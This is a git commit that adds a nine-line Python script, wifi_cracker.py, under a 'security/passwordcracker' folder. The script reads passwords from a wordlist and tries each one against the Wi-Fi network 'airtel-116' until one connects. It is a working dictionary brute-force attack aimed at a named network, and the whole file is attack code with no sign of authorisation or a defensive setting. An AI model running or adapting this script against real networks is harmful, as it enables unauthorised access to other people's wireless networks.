eabd51cf13793d17d1f827227232d8d8a391dba4
Juhi S Iyer <juhiiyer@gmail.com>
2021-11-20 14:21:22 +0530

    initial commit

---
+++ security/passwordcracker/wifi_cracker.py
@@ -0,0 +1,9 @@
+from wireless import Wireless
+
+wire = Wireless()
+with open('passwordlist.txt', 'r') as file:
+    for line in file.readlines():
+        if wire.connect(ssid='airtel-116', password=line.strip()) == True:
+            print('[+] ' + line.strip() + 'success!')
+        else:
+            print('[-] ' + line.strip() + ' - failed')
